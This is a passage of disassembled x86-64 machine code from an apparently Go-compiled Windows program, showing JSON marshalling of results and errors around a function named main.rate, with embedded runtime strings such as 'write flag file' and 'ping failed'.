   140273809:	48 8d 05 f0 d2 0b 00 	lea    rax,[rip+0xbd2f0]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273810:	48 8d 9c 24 20 01 00 	lea    rbx,[rsp+0x120]
   140273817:	00 
   140273818:	e8 23 ef d9 ff       	call   0x140012740 <runtime.convT>
   14027381d:	48 89 c3             	mov    rbx,rax
   140273820:	48 8d 05 d9 d2 0b 00 	lea    rax,[rip+0xbd2d9]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273827:	e8 94 77 e8 ff       	call   0x1400fafc0 <encoding/json.Marshal>
   14027382c:	48 8b 94 24 50 01 00 	mov    rdx,QWORD PTR [rsp+0x150]
   140273833:	00 
   140273834:	48 89 94 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rdx
   14027383b:	00 
   14027383c:	48 8b 54 24 50       	mov    rdx,QWORD PTR [rsp+0x50]
   140273841:	48 89 94 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rdx
   140273848:	00 
   140273849:	48 8d 15 bd 17 0f 00 	lea    rdx,[rip+0xf17bd]        # 0x14036500d 'resultoutputError:wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsock'
   140273850:	48 89 94 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rdx
   140273857:	00 
   140273858:	48 c7 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],0x6
   14027385f:	00 06 00 00 00 
   140273864:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   14027386b:	00 
   14027386c:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   140273873:	00 
   140273874:	48 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rcx
   14027387b:	00 
   14027387c:	48 8b 8c 24 d0 00 00 	mov    rcx,QWORD PTR [rsp+0xd0]
   140273883:	00 
   140273884:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   140273889:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   140273890:	00 
   140273891:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   140273896:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   14027389d:	00 
   14027389e:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   1402738a3:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   1402738aa:	00 
   1402738ab:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   1402738b2:	00 
   1402738b3:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   1402738b8:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   1402738bd:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   1402738c2:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   1402738c7:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   1402738cc:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   1402738d3:	00 
   1402738d4:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   1402738db:	00 
   1402738dc:	48 81 c4 70 01 00 00 	add    rsp,0x170
   1402738e3:	5d                   	pop    rbp
   1402738e4:	c3                   	ret
   1402738e5:	44 0f 11 bc 24 20 01 	movups XMMWORD PTR [rsp+0x120],xmm15
   1402738ec:	00 00 
   1402738ee:	44 0f 11 bc 24 30 01 	movups XMMWORD PTR [rsp+0x130],xmm15
   1402738f5:	00 00 
   1402738f7:	44 0f 11 bc 24 40 01 	movups XMMWORD PTR [rsp+0x140],xmm15
   1402738fe:	00 00 
   140273900:	48 8d 0d b6 5f 0f 00 	lea    rcx,[rip+0xf5fb6]        # 0x1403698bd 'request id is emptywrite flag file: %wping failed: %w: %sconnection closed! reflect.Value.IsNilrefle'
   140273907:	48 89 8c 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rcx
   14027390e:	00 
   14027390f:	48 c7 84 24 48 01 00 	mov    QWORD PTR [rsp+0x148],0x13
   140273916:	00 13 00 00 00 
   14027391b:	48 8d 05 de d1 0b 00 	lea    rax,[rip+0xbd1de]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273922:	48 8d 9c 24 20 01 00 	lea    rbx,[rsp+0x120]
   140273929:	00 
   14027392a:	e8 11 ee d9 ff       	call   0x140012740 <runtime.convT>
   14027392f:	48 89 c3             	mov    rbx,rax
   140273932:	48 8d 05 c7 d1 0b 00 	lea    rax,[rip+0xbd1c7]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273939:	e8 82 76 e8 ff       	call   0x1400fafc0 <encoding/json.Marshal>
   14027393e:	44 0f 11 bc 24 d0 00 	movups XMMWORD PTR [rsp+0xd0],xmm15
   140273945:	00 00 
   140273947:	44 0f 11 bc 24 d8 00 	movups XMMWORD PTR [rsp+0xd8],xmm15
   14027394e:	00 00 
   140273950:	44 0f 11 bc 24 e8 00 	movups XMMWORD PTR [rsp+0xe8],xmm15
   140273957:	00 00 
   140273959:	44 0f 11 bc 24 f8 00 	movups XMMWORD PTR [rsp+0xf8],xmm15
   140273960:	00 00 
   140273962:	48 8d 15 a4 16 0f 00 	lea    rdx,[rip+0xf16a4]        # 0x14036500d 'resultoutputError:wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsock'
   140273969:	48 89 94 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rdx
   140273970:	00 
   140273971:	48 c7 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],0x6
   140273978:	00 06 00 00 00 
   14027397d:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   140273984:	00 
   140273985:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   14027398c:	00 
   14027398d:	48 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rcx
   140273994:	00 
   140273995:	48 8b 8c 24 d0 00 00 	mov    rcx,QWORD PTR [rsp+0xd0]
   14027399c:	00 
   14027399d:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   1402739a2:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   1402739a9:	00 
   1402739aa:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   1402739af:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   1402739b6:	00 
   1402739b7:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   1402739bc:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   1402739c3:	00 
   1402739c4:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   1402739cb:	00 
   1402739cc:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   1402739d1:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   1402739d6:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   1402739db:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   1402739e0:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   1402739e5:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   1402739ec:	00 
   1402739ed:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   1402739f4:	00 
   1402739f5:	48 81 c4 70 01 00 00 	add    rsp,0x170
   1402739fc:	5d                   	pop    rbp
   1402739fd:	c3                   	ret
   1402739fe:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
   140273a03:	48 89 5c 24 10       	mov    QWORD PTR [rsp+0x10],rbx
   140273a08:	48 89 4c 24 18       	mov    QWORD PTR [rsp+0x18],rcx
   140273a0d:	48 89 7c 24 20       	mov    QWORD PTR [rsp+0x20],rdi
   140273a12:	48 89 74 24 28       	mov    QWORD PTR [rsp+0x28],rsi
   140273a17:	4c 89 44 24 30       	mov    QWORD PTR [rsp+0x30],r8
   140273a1c:	4c 89 4c 24 38       	mov    QWORD PTR [rsp+0x38],r9
   140273a21:	4c 89 54 24 40       	mov    QWORD PTR [rsp+0x40],r10
   140273a26:	e8 f5 4e e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   140273a2b:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
   140273a30:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
   140273a35:	48 8b 4c 24 18       	mov    rcx,QWORD PTR [rsp+0x18]
   140273a3a:	48 8b 7c 24 20       	mov    rdi,QWORD PTR [rsp+0x20]
   140273a3f:	48 8b 74 24 28       	mov    rsi,QWORD PTR [rsp+0x28]
   140273a44:	4c 8b 44 24 30       	mov    r8,QWORD PTR [rsp+0x30]
   140273a49:	4c 8b 4c 24 38       	mov    r9,QWORD PTR [rsp+0x38]
   140273a4e:	4c 8b 54 24 40       	mov    r10,QWORD PTR [rsp+0x40]
   140273a53:	e9 48 f2 ff ff       	jmp    0x140272ca0 <main.rate>
   140273a58:	cc                   	int3
   140273a59:	cc                   	int3
   140273a5a:	cc                   	int3
   140273a5b:	cc                   	int3
   140273a5c:	cc                   	int3
   140273a5d:	cc                   	int3
   140273a5e:	cc                   	int3
   140273a5f:	cc                   	int3
